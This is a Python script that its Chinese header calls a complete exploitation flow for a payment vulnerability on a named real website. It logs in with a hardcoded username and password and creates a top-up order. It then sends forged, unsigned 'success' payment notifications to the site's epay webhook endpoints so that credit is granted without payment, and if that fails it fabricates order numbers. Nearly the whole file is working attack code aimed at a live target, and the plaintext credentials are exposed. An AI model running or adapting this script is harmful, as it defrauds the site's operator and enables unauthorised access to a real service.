#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
timyai.com 支付漏洞完整利用流程
1. 登录获取认证
2. 创建充值订单获取真实订单号
3. 使用真实订单号测试 webhook
"""

import requests
import json
import time
import random
import string
import re

TARGET_URL = "http://timyai.com"
USERNAME = "antplayer"
PASSWORD = "sjh@101709"

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json',
    'Origin': TARGET_URL,
    'Referer': f"{TARGET_URL}/",
})

def generate_random_string(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def login():
    """登录获取认证"""
    print("[+] 尝试登录...")
    
    # 尝试不同的登录端点
    login_endpoints = [
        "/api/user/login",
        "/api/user/login?lang=zh-CN",
    ]
    
    for endpoint in login_endpoints:
        url = f"{TARGET_URL}{endpoint}"
        
        # 尝试 JSON 格式
        data = {"username": USERNAME, "password": PASSWORD}
        try:
            response = session.post(url, json=data, timeout=10)
            print(f"  JSON 登录 {endpoint}: {response.status_code}")
            
            if response.status_code == 200:
                result = response.json()
                print(f"  响应: {json.dumps(result, ensure_ascii=False)[:200]}")
                
                # 尝试从响应中提取 token
                token = None
                user_id = None
                
                if isinstance(result, dict):
                    # 检查各种可能的 token 位置
                    token = result.get('token') or result.get('access_token')
                    if 'data' in result and isinstance(result['data'], dict):
                        token = token or result['data'].get('token')
                        token = token or result['data'].get('access_token')
                        user_id = result['data'].get('id') or result['data'].get('user_id')
                
                if token:
                    print(f"  ✅ 登录成功! Token: {token[:30]}...")
                    return token, user_id
                    
        except Exception as e:
            print(f"  JSON 登录错误: {e}")
        
        # 尝试表单格式
        try:
            response = session.post(url, data=data, timeout=10)
            print(f"  Form 登录 {endpoint}: {response.status_code}")
            
            if response.status_code == 200:
                result = response.json()
                print(f"  响应: {json.dumps(result, ensure_ascii=False)[:200]}")
                
                token = result.get('token') or result.get('access_token')
                if token:
                    print(f"  ✅ 登录成功!")
                    return token, None
                    
        except Exception as e:
            print(f"  Form 登录错误: {e}")
    
    # 尝试 Web 登录页面获取 token
    print("\n[+] 尝试通过 Web 页面登录...")
    try:
        # 获取登录页面
        login_page = session.get(f"{TARGET_URL}/login", timeout=10)
        print(f"  登录页面: {login_page.status_code}")
        
        # 提交登录表单
        login_data = {
            "username": USERNAME,
            "password": PASSWORD,
            "remember": "on"
        }
        
        response = session.post(
            f"{TARGET_URL}/api/user/login",
            data=login_data,
            allow_redirects=False,
            timeout=10
        )
        print(f"  表单提交: {response.status_code}")
        print(f"  响应头: {dict(response.headers)}")
        print(f"  响应内容: {response.text[:200]}")
        
        # 检查是否设置了 cookie
        if session.cookies:
            print(f"  Cookie: {dict(session.cookies)}")
        
        # 尝试使用 cookie 访问受保护的端点
        protected = session.get(f"{TARGET_URL}/api/user/self", timeout=10)
        print(f"  访问 /api/user/self: {protected.status_code}")
        print(f"  响应: {protected.text[:200]}")
        
    except Exception as e:
        print(f"  Web 登录错误: {e}")
    
    return None, None

def create_topup_order(token, amount="100"):
    """创建充值订单"""
    print(f"\n[+] 创建充值订单 (金额: {amount})...")
    
    headers = {}
    if token:
        headers['Authorization'] = f'Bearer {token}'
    
    # 获取充值页面信息
    try:
        url = f"{TARGET_URL}/api/user/topup/info"
        response = session.get(url, headers=headers, timeout=10)
        print(f"  获取充值信息: {response.status_code}")
        print(f"  响应: {response.text[:300]}")
    except Exception as e:
        print(f"  获取充值信息错误: {e}")
    
    # 创建充值订单
    try:
        url = f"{TARGET_URL}/api/user/topup"
        data = {"amount": amount, "method": "alipay"}
        response = session.post(url, json=data, headers=headers, timeout=10)
        print(f"  创建充值订单: {response.status_code}")
        print(f"  响应: {response.text[:500]}")
        
        if response.status_code == 200:
            result = response.json()
            
            # 提取订单号
            trade_no = None
            
            if isinstance(result, dict):
                # 检查各种可能的订单号位置
                trade_no = result.get('trade_no') or result.get('order_id')
                if 'data' in result and isinstance(result['data'], dict):
                    trade_no = trade_no or result['data'].get('trade_no')
                    trade_no = trade_no or result['data'].get('order_id')
                    # 也可能包含在 url 或其他字段中
                    if 'url' in result['data']:
                        url_content = str(result['data']['url'])
                        # 尝试从 URL 中提取订单号
                        match = re.search(r'trade_no[=]([^&]+)', url_content)
                        if match:
                            trade_no = match.group(1)
            
            if trade_no:
                print(f"  ✅ 获取到订单号: {trade_no}")
                return trade_no
            else:
                print(f"  ❌ 未找到订单号")
                print(f"  完整响应: {json.dumps(result, ensure_ascii=False)}")
                
    except Exception as e:
        print(f"  创建充值订单错误: {e}")
    
    return None

def exploit_webhook(trade_no, amount="100"):
    """使用真实订单号测试 webhook"""
    print(f"\n[+] 使用订单号 {trade_no} 测试 webhook...")
    
    params = {
        "trade_no": trade_no,
        "status": "success",
        "amount": amount,
        "param": "",
        "time": str(int(time.time())),
        "type": "alipay",
    }
    
    results = {}
    
    # 测试 GET 请求
    for endpoint in ["/api/user/epay/notify", "/api/subscription/epay/notify"]:
        try:
            url = f"{TARGET_URL}{endpoint}"
            response = session.get(url, params=params, timeout=10)
            print(f"  GET {endpoint}: {response.status_code} - {response.text[:100]}")
            results[f"GET {endpoint}"] = {
                "status": response.status_code,
                "response": response.text,
                "success": response.text.strip().lower() in ["success", "ok"]
            }
        except Exception as e:
            print(f"  GET {endpoint} 错误: {e}")
            results[f"GET {endpoint}"] = {"error": str(e)}
    
    # 测试 POST 请求
    for endpoint in ["/api/user/epay/notify", "/api/subscription/epay/notify"]:
        try:
            url = f"{TARGET_URL}{endpoint}"
            response = session.post(url, data=params, timeout=10)
            print(f"  POST {endpoint}: {response.status_code} - {response.text[:100]}")
            results[f"POST {endpoint}"] = {
                "status": response.status_code,
                "response": response.text,
                "success": response.text.strip().lower() in ["success", "ok"]
            }
        except Exception as e:
            print(f"  POST {endpoint} 错误: {e}")
            results[f"POST {endpoint}"] = {"error": str(e)}
    
    return results

def main():
    print("="*60)
    print("timyai.com 支付漏洞完整利用流程")
    print("="*60)
    
    # 1. 登录
    token, user_id = login()
    
    if not token:
        print("\n[-] 登录失败，使用无认证方式测试...")
    else:
        print(f"\n[+] 登录成功，用户ID: {user_id}")
    
    # 2. 创建充值订单获取订单号
    trade_no = create_topup_order(token, "100")
    
    if trade_no:
        print(f"\n[+] 成功获取订单号: {trade_no}")
        
        # 3. 使用真实订单号测试 webhook
        results = exploit_webhook(trade_no, "100")
        
        # 总结
        print("\n" + "="*60)
        print("测试结果总结")
        print("="*60)
        
        for method, result in results.items():
            if "error" in result:
                print(f"  {method}: ❌ {result['error']}")
            else:
                status = "⚠️  漏洞确认!" if result.get("success") else "✅ 防护正常"
                print(f"  {method}: {status} (响应: {result['response'][:50]})")
    else:
        print("\n[-] 无法获取订单号，尝试直接测试 webhook...")
        
        # 尝试构造订单号格式
        fake_trade_no = f"SUBUSR{user_id or 999}NO{generate_random_string()}{int(time.time())}"
        results = exploit_webhook(fake_trade_no, "100")
        
        print("\n" + "="*60)
        print("测试结果总结")
        print("="*60)
        
        for method, result in results.items():
            if "error" in result:
                print(f"  {method}: ❌ {result['error']}")
            else:
                status = "⚠️  漏洞确认!" if result.get("success") else "✅ 防护正常"
                print(f"  {method}: {status}")

if __name__ == "__main__":
    main()